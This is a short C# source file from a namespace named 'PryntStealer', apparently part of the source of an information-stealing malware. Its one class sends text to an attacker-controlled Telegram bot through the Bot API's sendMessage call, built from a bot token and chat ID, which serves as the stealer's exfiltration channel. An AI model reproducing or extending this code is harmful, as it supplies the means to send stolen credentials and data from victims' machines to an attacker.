using System;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;

namespace PryntStealer
{
    class sendtg
    {
        public static void sendText(string text, string ChatID,string bottoken)
        {
            
            using (WebClient client = new WebClient())
            {
                ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
                client.DownloadString(
                    "https://api.telegram.org/bot" +
                    bottoken +
                    "/sendMessage" +
                    "?chat_id=" + ChatID +
                    "&text=" + text
                );
            }
        }

    }
}
